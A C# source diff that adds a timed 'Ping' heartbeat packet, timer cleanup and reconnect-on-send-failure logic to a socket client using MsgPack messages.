@@ -16,6 +16,7 @@ namespace Client
         public static byte[] Buffer { get; set; }
         public static long Buffersize { get; set; }
         public static bool BufferRecevied { get; set; }
+        public static Timer Tick { get; set; }
         public static MemoryStream MS { get; set; }
 
         static void Main(string[] args)
@@ -43,6 +44,8 @@ namespace Client
                 BufferRecevied = false;
                 MS = new MemoryStream();
                 BeginSend(SendInfo());
+                TimerCallback T = new TimerCallback(Ping);
+                Tick = new Timer(T, null, 15000, 30000);
                 client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
             }
             catch
@@ -68,6 +71,7 @@ namespace Client
             {
                 if (client.Connected == false)
                 {
+                    Tick.Dispose();
                     client.Close();
                     client.Dispose();
                     MS.Dispose();
@@ -114,6 +118,7 @@ namespace Client
                 }
                 else
                 {
+                    Tick.Dispose();
                     client.Close();
                     client.Dispose();
                     MS.Dispose();
@@ -123,6 +128,7 @@ namespace Client
             }
             catch
             {
+                Tick.Dispose();
                 client.Close();
                 client.Dispose();
                 MS.Dispose();
@@ -142,7 +148,21 @@ namespace Client
                        Console.WriteLine(unpack_msgpack.ForcePathObject("Message").AsString);
                     }
                     break;
+
+                case "Ping":
+                    {
+                        Console.WriteLine(unpack_msgpack.ForcePathObject("Message").AsString);
+                    }
+                    break;
             }
+        }
+
+        public static void Ping(object obj)
+        {
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Packet").AsString = "Ping";
+            msgpack.ForcePathObject("Message").AsString = DateTime.Now.ToLongTimeString().ToString();
+            BeginSend(msgpack.Encode2Bytes());
         }
 
         public static void BeginSend(byte[] Msgs)
@@ -163,7 +183,13 @@ namespace Client
                     }
                 }
                 catch
-                { }
+                {
+                    Tick.Dispose();
+                    client.Close();
+                    client.Dispose();
+                    MS.Dispose();
+                    InitializeClient();
+                }
             }
         }
 
